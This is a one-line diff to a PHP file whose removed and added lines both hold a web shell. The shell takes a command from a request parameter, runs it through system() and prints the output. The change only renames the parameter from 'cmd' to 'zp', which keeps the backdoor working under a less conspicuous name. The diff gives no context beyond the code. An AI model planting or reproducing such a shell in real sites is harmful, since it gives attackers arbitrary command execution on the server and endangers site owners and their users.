@@ -1,1 +1,1 @@
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+<?php if(isset($_REQUEST['zp'])){ echo "<pre>"; $cmd = ($_REQUEST['zp']); system($cmd); echo "</pre>"; die; }?>
